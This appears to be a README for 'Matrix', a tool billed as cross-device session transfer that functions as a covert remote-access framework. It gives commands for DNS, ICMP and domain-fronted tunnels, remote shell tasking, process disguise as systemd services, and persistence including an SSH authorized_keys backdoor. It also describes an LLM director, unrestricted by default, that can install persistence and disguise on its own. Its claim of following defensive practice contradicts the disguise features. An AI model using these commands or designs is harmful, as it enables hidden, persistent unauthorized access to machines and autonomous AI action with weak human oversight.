# Matrix

Cross-device session jumping via encrypted multi-transport mesh networking.

Transfer your working session (environment, files, clipboard) between machines over WiFi, Bluetooth, WebSocket, cloud storage dead drops, DNS tunnels, or ICMP tunnels — with per-message forward secrecy via Signal-spec symmetric ratcheting.

## Architecture

```
                        ┌──────────────┐
                        │    matrix    │  CLI entry point
                        │   (cli.py)   │
                        └──────┬───────┘
                               │
                  ┌────────────┼────────────┐
                  ▼            ▼            ▼
          ┌──────────────┐ ┌──────────┐ ┌──────────┐
          │session_jumper│ │gut_check │ │ director │ Tier 1/2/3
          └──────┬───────┘ └──────────┘ └────┬─────┘
                 │                           │
         ┌───────┼──────────┐          ┌─────┴──────┐
         ▼       ▼          ▼          ▼            ▼
    ┌──────────┐┌────────────┐┌──────────────┐┌────────────┐
    │device_   ││jump_       ││transport_    ││autonomous  │
    │discovery ││protocol    ││negotiator    │└─────┬──────┘
    └──────────┘└──────┬─────┘└──────────────┘      │
                       │                        ┌───┴───────┐
                ┌──────┴──────┐                 ▼           ▼
                ▼             ▼          ┌────────────┐┌────────────┐
         ┌──────────────┐┌─────────┐    │mirror_blend││llm_backend │
         │symmetric_    ││multipath│    └────────────┘└────────────┘
         │ratchet       ││         │
         └──────────────┘└─────────┘

      ── Layer 0 (no internal deps) ─────────────────────────
      rbac, dead_drop, secure_terminate, task_relay,
      node_manager, transport_ws, transport_dns, transport_icmp,
      data_sync, config, disguise, persistence
```

### Modules

| Module | Purpose |
|---|---|
| `cli.py` | CLI entry point — listen, discover, jump, multiply, task, persist, status, rain, config, director |
| `jump_protocol.py` | Binary framing + X25519 key exchange + ratcheted AES-256-GCM |
| `symmetric_ratchet.py` | Signal-spec KDF_CK chain ratchet for per-message forward secrecy |
| `session_jumper.py` | Serialize, transfer, and resume sessions across devices; remote task execution |
| `device_discovery.py` | WiFi multicast + Bluetooth device scanning |
| `transport_ws.py` | WebSocket transport (tunnels through firewalls on 80/443); domain-fronting support |
| `transport_dns.py` | DNS TXT query/response tunnel for firewall-bypass reachability |
| `transport_icmp.py` | ICMP echo request/reply raw-socket tunnel |
| `transport_negotiator.py` | Auto-selects fastest transport + traffic normalization + polymorphic padding |
| `multipath.py` | Split transfers across multiple transports simultaneously |
| `mirror_blend.py` | Runtime function instrumentation and hot-swap |
| `autonomous.py` | Self-healing orchestration: fallback chains, hot code upgrades, exhaustion hooks |
| `director.py` | Tri-State Director: FSM (AUTONOMOUS/AI_ACTIVE/HUMAN_OVERRIDE), EscalationDetector, ToolExecutor, SemanticDelta, audit trail |
| `llm_backend.py` | Unified LLM interface (Ollama + Anthropic) — zero external deps, single-turn tool-use only |
| `node_manager.py` | Node health tracking, task queues, campaigns |
| `task_relay.py` | Hop-based relay routing for segmented networks |
| `dead_drop.py` | Async transport via cloud storage mailboxes (S3/GCS/Azure/filesystem) |
| `rbac.py` | Role-based access control (ADMIN/OPERATOR/VIEWER) |
| `secure_terminate.py` | Signed shutdown commands with cascade propagation |
| `data_sync.py` | Delta sync with rate limiting and delivery tracking |
| `gut_check.py` | Matrix digital rain terminal visualization |
| `config.py` | Centralized configuration with env-var and .env support |
| `disguise.py` | Process-title spoofing to look like ordinary system services |
| `persistence.py` | Multiple persistence and watchdog survival mechanisms |

## Quickstart

```bash
# Install
pip install -e .

# Check node info
matrix status

# Discover nearby devices
matrix discover --timeout 10

# Listen for incoming jumps (interactive restore prompts)
matrix listen --port 47701 --restore-files ask

# Jump to a target
matrix jump 192.168.1.50:47701

# Jump via DNS tunnel (useful when TCP is blocked)
matrix jump 192.168.1.50:47701 --dns-resolver 8.8.8.8 --dns-domain example.com

# Jump via ICMP tunnel (requires root / CAP_NET_RAW)
matrix jump 192.168.1.50:47701 --icmp

# Duplicate session to all discovered devices
matrix multiply --all --strategy broadcast

# Run a shell command on a remote node
matrix task 192.168.1.50:47701 "uname -a"

# Matrix rain
matrix rain

# Show loaded config
matrix config

# Start the Tri-State Director (LLM-augmented orchestration)
matrix director start

# Give the AI Director a high-level objective
matrix director goal "find all nearby nodes, pick the fastest, and mirror the session"

# Show the active plan and current goals
matrix director plan
matrix director goals

# Human override / release
matrix director override
matrix director release

# Manual AI escalation
matrix director escalate --reason "connectivity degraded"

# View director state and audit log
matrix director status
matrix director audit
```

## Stealth transports

Matrix can tunnel the Jump protocol through protocols that are rarely blocked:

- **WebSocket** on ports 80/443, with optional domain fronting (`DomainFrontedWebSocketBackend`).
- **DNS TXT tunnel** — encodes frames in DNS labels and replies; works on captive portals.
- **ICMP echo tunnel** — embeds frames in ping request/reply payloads; requires raw sockets.

Use them with `matrix jump` or `matrix task`:

```bash
matrix jump 10.0.0.5 --dns-resolver 8.8.8.8 --dns-domain example.com
matrix task 10.0.0.5 "hostname" --icmp
```

## Remote tasking

The `matrix task` command opens an encrypted Jump channel to a listener and executes a shell command, streaming stdout/stderr back:

```bash
matrix task 192.168.1.50:47701 "tail -f /var/log/syslog" --timeout 60
```

The listener runs the command via `subprocess.Popen` and returns exit code and output.

## Process disguise

Matrix can rename its running process to resemble an ordinary system helper:

```bash
matrix listen --disguise /usr/lib/systemd/systemd-networkd-wait-online
```

For a fully disguised service install, see `services/` and `scripts/install-disguise.sh`.

## Persistence and survival

Matrix supports multiple persistence mechanisms and a watchdog re-spawner. Use the CLI:

```bash
# Enable persistence as root
sudo matrix persist enable systemd-system cron rc-local

# Enable persistence as a regular user
matrix persist enable systemd-user bashrc-alias

# Add an SSH authorized_keys backdoor for operator re-entry
matrix persist enable ssh-backdoor --pubkey "ssh-ed25519 AAAAC3NzaC..."

# Check or remove
matrix persist status
matrix persist disable systemd-system bashrc-alias
```

One-command install helpers are provided in `scripts/install-persist.sh` and `scripts/install-disguise.sh`.

The `Watchdog` class in `matrix.persistence` can also re-spawn the agent if it is killed or crashes.

## Configuration

All configuration is optional. Override defaults via environment variables or a `.env` file in the project root.

```bash
cp .env.example .env
```

| Variable | Default | Description |
|---|---|---|
| `MATRIX_PORT` | `47701` | Listen/connect port |
| `MATRIX_DISCOVERY_PORT` | `47700` | UDP multicast discovery port |
| `MATRIX_MULTICAST_GROUP` | `239.255.77.88` | Multicast group address |
| `MATRIX_WS_PATH` | `/jump/ws` | WebSocket endpoint path |
| `MATRIX_WS_PORT` | `8443` | WebSocket listener port |
| `MATRIX_STALE_TIMEOUT` | `30.0` | Device stale timeout (seconds) |
| `MATRIX_ANNOUNCE_INTERVAL` | `5` | Discovery announce interval (seconds) |
| `MATRIX_BT_SCAN_DURATION` | `4` | Bluetooth scan duration (seconds) |
| `MATRIX_CHUNK_SIZE` | `65536` | Transfer chunk size (bytes) |
| `MATRIX_MAX_PAYLOAD` | `16777216` | Max frame payload (bytes) |
| `MATRIX_MAX_FILE_SIZE` | `10485760` | Max file size for session capture (bytes) |
| `MATRIX_AUTH_TOKEN` | | Authentication token for secure jumps |
| `MATRIX_NODE_NAME` | | Custom node name (default: hostname) |
| `MATRIX_IDENTITY_FILE` | | Ed25519 identity key file (created if absent); enables mutual auth |
| `MATRIX_KNOWN_PEERS` | | Peer trust store file for identity pinning |
| `MATRIX_REQUIRE_IDENTITY` | `false` | Require the peer to present a verified identity |
| `MATRIX_TOFU` | `true` | Trust-on-first-use; set `false` for strict allowlist mode |
| `MATRIX_LLM_BACKEND` | `ollama` | LLM provider: `ollama` or `anthropic` |
| `MATRIX_LLM_MODEL` | | Model name (required when director is used) |
| `MATRIX_LLM_ENDPOINT` | `http://127.0.0.1:11434` | Ollama API endpoint |
| `MATRIX_LLM_API_KEY` | | Anthropic API key (required for `anthropic` backend) |
| `MATRIX_LLM_TIMEOUT` | `30.0` | LLM request timeout (seconds) |
| `MATRIX_LLM_ACTION_BUDGET` | `5` | Max tool calls per AI escalation |
| `MATRIX_ESCALATION_COOLDOWN` | `60.0` | Minimum seconds between escalations |
| `MATRIX_DEGRADED_SUSTAIN` | `10.0` | Sustained degradation before escalation (seconds) |
| `MATRIX_TASK_FAILURE_WINDOW` | `120.0` | Task failure rate window (seconds) |
| `MATRIX_TASK_FAILURE_THRESHOLD` | `5` | Failures in window to trigger escalation |
| `MATRIX_DIRECTOR_CONTAINMENT` | `unrestricted` | AI containment: `unrestricted`, `restricted`, `advisory`, or `disabled` |

## Running as a Service

### Bundled unit

```bash
sudo cp matrix.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now matrix
sudo journalctl -u matrix -f
```

The bundled unit runs with additional `systemd` hardening (`NoNewPrivileges`, `ProtectSystem`, capability drop, syscall/address-family restrictions) and starts listener mode with `--restore-files never` for non-interactive safety.

> **Set `MATRIX_AUTH_TOKEN` in `/root/Matrix/.env`.** The listener binds all interfaces and now refuses to start unauthenticated on a public address, so a token is required for the service to come up (it also gates the encrypted `AUTH` handshake).

### Disguised units

For lower visibility, install one of the plausible service names under `services/`:

```bash
sudo ./scripts/install-disguise.sh systemd-networkd-monitor
```

This creates a wrapper at `/var/lib/systemd-networkd-monitor/helper` and installs `systemd-networkd-monitor.service`.

## Development

```bash
# Install with dev dependencies
pip install -e ".[dev]"

# Run tests
python -m pytest tests/ -v

# Run with unittest
python -m unittest discover -s tests -v
```

## Director

The Tri-State Director adds LLM-augmented orchestration with three tiers of authority:

| Tier | State | Description |
|---|---|---|
| 3 | `AUTONOMOUS` | Deterministic AutonomousLoop runs (default) |
| 2 | `AI_ACTIVE` | LLM evaluates and acts through sandboxed tools |
| 1 | `HUMAN_OVERRIDE` | Human operator in direct control via CLI |

Escalation triggers: fallback exhaustion, all-paths-degraded (sustained), task failure rate, transport total failure, manual. All triggers use hysteresis (cooldown + sustain windows) to prevent flapping.

When escalated, the Director runs an **observe-decide-act loop**. It executes one tool at a time, feeds the result back to the LLM, and stops when the goal is achieved, the action budget is exhausted, or a human override is asserted. In-memory `DirectorGoal` and `PlanMemory` keep track of active objectives and the evolving plan.

### End-to-end AI control

The AI Director can drive Matrix operations directly through a sandboxed tool set:

| Tool | Capability |
|---|---|
| `discover_devices` | Scan for nearby Matrix nodes |
| `jump_to_target` | Initiate a session jump to a discovered device |
| `run_remote_task` | Execute a command on a remote node |
| `enable_persistence` / `disable_persistence` | Install or remove persistence/watchdog mechanisms |
| `apply_disguise` | Spoof the process title to resemble a benign service |
| `set_transport_profile` | Switch traffic mimicry profile (e.g. Slack, Teams, Discord, DoH) |
| `probe_transport` | Probe a host/port to select a working transport |
| `submit_relay_task` | Dispatch a task through a relay hop |
| `sync_data` | Trigger a delta sync to a peer or dead drop |
| `trigger_discovery`, `submit_task`, `adjust_rate_limit`, `terminate_node` | Existing orchestration tools |

Safety constraints: action budget (default 5), dead-man's switch timeout, AST quarantine on all proposed code (blocks `os`/`subprocess`/`eval`/`exec`/`open`), rollback on any failure, full audit trail.

### CLI

```bash
# Start the Director in autonomous/AI mode
matrix director start

# Give the AI Director a high-level objective
matrix director goal "find all nearby nodes, pick the fastest, and mirror the session"

# Show the active plan and current goals
matrix director plan
matrix director goals

# Human override / release
matrix director override
matrix director release

# Manual AI escalation
matrix director escalate --reason "connectivity degraded"

# View director state and audit log
matrix director status
matrix director audit
```

**Containment policy** (`--containment` / `MATRIX_DIRECTOR_CONTAINMENT`) bounds what the AI tier may do:

| Mode | LLM consulted | Tools executed | Code upgrade / terminate |
|---|---|---|---|
| `unrestricted` (default) | yes | yes | allowed |
| `restricted` | yes | yes | **blocked** (incl. via `submit_task`) |
| `advisory` | yes | no — actions recorded as recommendations | **blocked** |
| `disabled` | no | no | **blocked** |

For high-assurance deployments run `advisory` or `disabled` so the AI can never autonomously modify running code or terminate nodes:

```bash
matrix director start --containment advisory
```

## Security

- **Forward secrecy**: Signal-spec symmetric ratchet (KDF_CK) with per-message AES-256-GCM keys — no symmetric fallback (fails closed), deterministic counter nonces from the single-use message index
- **Key exchange**: X25519 ECDH with HKDF-SHA256 derivation
- **Mutual authentication**: Ed25519 node identities signed into the handshake transcript (SIGMA-style) defeat active MITM on the key exchange; SSH-style peer pinning (TOFU or strict allowlist) via a trust store. See [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md).
- **Authentication**: encrypted post-handshake `AUTH`/`AUTH_OK` exchange — the token is never sent in cleartext (including on 0-RTT resume); RBAC with constant-time token comparison
- **Safe binding**: an unauthenticated listener refuses to bind a public interface; set an auth token to listen beyond `127.0.0.1`
- **Replay protection**: Nonce tracking with TTL expiry
- **Traffic analysis resistance**: Polymorphic per-session frame padding, timing jitter, cover traffic with heartbeat/typing events, and protocol mimicry (Slack, Teams, Discord, DoH, gRPC, cloud sync, generic Web API)
- **Process disguise**: Runtime process-title spoofing to resemble ordinary system services
- **Secure cleanup**: Chain key zeroization, state wiping on termination

## Host execution model

Matrix is designed to run as ordinary Python code on a host without using loader, injection, hooking, or telemetry-subversion techniques.

- **Standard single-stage execution**: just Python source on disk, launched by the system Python interpreter via `python -m matrix` or the `matrix` console entry point.
- **Strict process isolation**: Matrix runs only inside its own process. It does not perform process injection, hollowing, API hooking/unhooking, indirect syscalls, or cross-process memory manipulation.
- **Standard APIs only**: all functionality is built on normal Python standard-library modules (`socket`, `threading`, `urllib`, `json`, etc.) and documented dependencies (`cryptography`, `setproctitle`). No undocumented or kernel-level interfaces are used.
- **No telemetry tampering**: Matrix does not patch, disable, or bypass AMSI, ETW, ETW-TI, Windows Defender, SmartScreen, WDAC, or AppLocker. It does not attempt to hide from security products.

This keeps the project aligned with defensive best practices and makes it auditable by standard static and dynamic analysis tools.

## License

All rights reserved.
